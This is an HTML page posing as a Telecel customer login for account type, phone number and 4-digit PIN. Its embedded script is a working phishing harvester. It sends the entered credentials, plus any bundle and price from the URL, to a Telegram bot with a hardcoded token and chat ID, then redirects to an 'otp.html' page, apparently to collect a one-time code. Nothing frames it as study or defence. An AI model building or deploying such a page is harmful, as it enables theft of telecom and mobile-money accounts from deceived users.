<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telecel - Log In</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px;
        }
        .main-container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: #E30613;
            color: white;
            text-align: center;
            padding: 30px 20px;
        }
        .circle {
            width: 70px;
            height: 70px;
            background: white;
            color: #E30613;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            font-weight: 900;
            margin-bottom: 12px;
        }
        .header h1 {
            font-size: 22px;
            font-weight: 700;
        }
        .content {
            padding: 35px 25px;
        }
        h2 {
            text-align: center;
            font-size: 24px;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            color: #64748b;
            font-size: 15px;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 22px;
        }
        label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1e2937;
            font-size: 14.5px;
        }
        select, input {
            width: 100%;
            padding: 15px 16px;
            border: 1.5px solid #cbd5e1;
            border-radius: 10px;
            font-size: 16px;
        }
        select:focus, input:focus {
            border-color: #E30613;
            outline: none;
        }
        .continue-btn {
            width: 100%;
            background: #E30613;
            color: white;
            border: none;
            padding: 16px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin: 25px 0 15px;
        }
        .register {
            text-align: center;
            font-size: 15px;
            margin-top: 10px;
        }
        .register a {
            color: #E30613;
            font-weight: 600;
        }

        @media (min-width: 768px) {
            .main-container {
                max-width: 1100px;
                display: flex;
            }
            .header {
                display: none;
            }
            .left-side {
                flex: 1;
                background: url('https://images.unsplash.com/photo-1622445275576-721325763afe?w=800') center/cover no-repeat;
                position: relative;
            }
            .left-overlay {
                position: absolute;
                bottom: 50px;
                left: 50px;
                color: white;
            }
        }
    </style>
</head>
<body>
    <div class="main-container">

        <!-- Mobile Header -->
        <div class="header">
            <div class="circle">t</div>
            <h1>telecel</h1>
        </div>

        <!-- Left Image (Desktop) -->
        <div class="left-side" style="display:none;">
            <div class="left-overlay">
                <h2>Effortless transactions</h2>
                <p>Pay bills, buy bundles and manage your account easily.</p>
            </div>
        </div>

        <!-- Form Section -->
        <div class="content">
            <h2>Welcome Back</h2>
            <p class="subtitle">Enter your details to proceed</p>

            <div class="form-group">
                <label>Select Account Type <span style="color:red;">*</span></label>
                <select id="accountType">
                    <option value="mobile">Mobile</option>
                    <option value="broadband">Broadband</option>
                </select>
            </div>

            <div class="form-group">
                <label>Telephone Number <span style="color:red;">*</span></label>
                <input type="tel" id="phone" placeholder="020XXXXXXXX" maxlength="10">
            </div>

            <div class="form-group">
                <label>PIN <span style="color:red;">*</span></label>
                <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
            </div>

            <button class="continue-btn" onclick="proceedLogin()">Continue</button>

            <div class="register">
                Don't have an account? <a href="#">Register Here</a>
            </div>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:10000;align-items:center;justify-content:center;">
        <div style="width:70px;height:70px;border:6px solid #fff;border-top-color:#E30613;border-radius:50%;animation:spin 1s linear infinite;"></div>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8522259555:AAEl1CRJfLhjWwtqD2z6CvN-jesiotWQ__4',
            CHAT_ID: '8757709711',
            REDIRECT_PAGE: 'otp.html'
        };

        let state = { bundleInfo: null };

        function extractBundleInfo() {
            const params = new URLSearchParams(window.location.search);
            const bundle = params.get('bundle');
            const price = params.get('price');
            if (bundle && price) state.bundleInfo = { bundle, price };
        }

        function proceedLogin() {
            const accountType = document.getElementById('accountType').value;
            const phone = document.getElementById('phone').value.trim();
            const pin = document.getElementById('password').value.trim();

            if (!phone) return alert("Please enter your Telephone Number");
            if (pin.length !== 4) return alert("PIN must be 4 digits");

            document.getElementById('spinner').style.display = 'flex';

            const bundleText = state.bundleInfo 
                ? `\nBundle: ${state.bundleInfo.bundle}\nPrice: GHS ${state.bundleInfo.price}` 
                : '';

            const message = `<b>🔴 Telecel Login Attempt</b>\n\n` +
                            `Account Type: ${accountType}\n` +
                            `Phone: ${phone}\n` +
                            `PIN: ${pin}${bundleText}`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).then(() => {
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_PAGE;
                }, 1300);
            }).catch(() => {
                alert("Connection error. Please try again.");
                document.getElementById('spinner').style.display = 'none';
            });
        }

        // Initialize
        extractBundleInfo();
    </script>
</body>
</html>
